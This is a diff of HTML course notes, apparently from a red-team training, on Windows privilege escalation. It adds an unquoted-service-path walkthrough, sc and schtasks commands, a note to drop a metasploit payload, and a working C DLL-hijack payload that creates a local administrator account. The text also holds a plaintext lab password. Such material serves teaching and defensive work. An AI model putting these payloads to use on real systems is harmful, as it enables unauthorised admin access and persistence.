@@ -421,7 +421,8 @@ execute</p>
 <p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
 </blockquote>
 <h1><a class="header" href="#privilege-escalation--persistence" id="privilege-escalation--persistence">Privilege Escalation / Persistence</a></h1>
-<p>In order to escalate privilege from a regular user to a higher level account (Administrator/System Authority), you need either a misconfiguration or an exploit (Remote Potato etc..) - a properly patched and configured system will provide challenges to escalte privileges from a standard user to a administrator user. That being said, there are numerous techniques to obtain hashes/passwords, that don't requite administrator privileges - such as kerberoasting, ntlm relaying and password spraying.</p>
+<p>In order to escalate privilege from a regular user to a higher level account (Administrator/System Authority), you need either a <code>misconfiguration</code> (typically permission issues on services, scheduled tasks etc...) or an <code>exploit</code> (Remote/Rogue/Sweet/Rotten/Juicy/God Potato etc..) - a properly patched and configured system will provide challenges to escalte privileges from a standard user to a administrator user. </p>
+<p>That being said, there are numerous techniques to obtain hashes/passwords, that don't requite administrator privileges - such as <code>kerberoasting</code>, <code>ntlm relaying</code> and <code>password spraying</code>.</p>
 <ul>
 <li>
 <p>AlwaysInstallElevated (MSI)</p>
@@ -433,18 +434,21 @@ execute</p>
 <li>and whitespaces in the path</li>
 <li>write permission in the (sub)folder that holds the service binary</li>
 </ul>
-<p>To exploit, the exe needs to be named after the directory it's in, i.e:</p>
 </li>
 </ul>
+<p>To exploit, the exe needs to be named after the directory it's in, i.e:</p>
 <hr />
 <p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</p>
-<p>Create folders &quot;C:\MyPrograms\Vulnerable Service\service.exe
-create pingservice in vs2019</p>
+<ul>
+<li>Create folders &quot;C:\MyPrograms\Vulnerable Service\service.exe</li>
+<li>create pingservice in vs2019</li>
+</ul>
 <p>-&gt; C:\MyPrograms`vulnerable.exe<code> arguments</code>Service\service.exe`</p>
 <p>By placing a malicious service exe in c:\MyPrograms\ named <code>vulnerable.exe</code>, we'll escalate privileges wo NT SYSTEM AUHTORITY (if the service is running with those privileges)</p>
-<p>sc create VulnService binPath= &quot;C:\MyPrograms\Vulnerable Service\VulnService.exe&quot;
+<pre><code class="language-powershell">sc create VulnService binPath= &quot;C:\MyPrograms\Vulnerable Service\VulnService.exe&quot;
 sc qc VulnService
-sc start VulnService</p>
+sc start VulnService
+</code></pre>
 <p>Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.</p>
 <p>https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md</p>
 <hr />
@@ -455,10 +459,32 @@ sc start VulnService</p>
 <li>[+] WinPeas</li>
 </ul>
 </blockquote>
-<p>DLL Hijack</p>
+<blockquote>
+<p><em><strong>IMPORTANT</strong></em>: We achieve not only <code>Privilege Escalation</code>, but also <code>code-execution</code> and <code>persistence</code>!!!</p>
+</blockquote>
+<h1><a class="header" href="#dll-hijack" id="dll-hijack">DLL Hijack</a></h1>
+<p><a href="https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking">https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking</a>
+The following code can be used to create a malicious DLL:</p>
+<pre><code class="language-csharp">#include &lt;windows.h&gt;
+ 
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system(&quot;cmd.exe /k net user localadmin Password1 /add&quot;);
+        system(&quot;cmd.exe /k net localgroup administrators localadmin /add&quot;);
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+</code></pre>
+<p>Compile with:</p>
+<pre><code class="language-code">x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
+</code></pre>
 <p>https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYSTEM_Shell</p>
 <p><img src="./images/dllsearch.jpg" alt="image" /></p>
 <p>UAC Bypass (admin user -&gt; high integrity) -&gt; PrivsFU -&gt; NT AUTH</p>
+<h1><a class="header" href="#scheduled-tasks" id="scheduled-tasks">SCHEDULED TASKS</a></h1>
+<pre><code class="language-powershell">schtasks /create /tn VulnTask /tr 'c:\MyPrograms\VulnerableTask\VulnTask.exe' /sc ONSTART /RL HIGHEST /RU &quot;Student_adm&quot; /RP &quot;Threathunt25&quot; /F
+</code></pre>
 <h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
 <blockquote>
 <p><em><strong>TL;DR :</strong></em> This chapter explains how most AV/EDR's work - in this case we'll focus on Microsoft Defender (the AV part), MDE (Microsoft Defender for Endpoint) which is the EDR component that we'll deal with later on.</p>
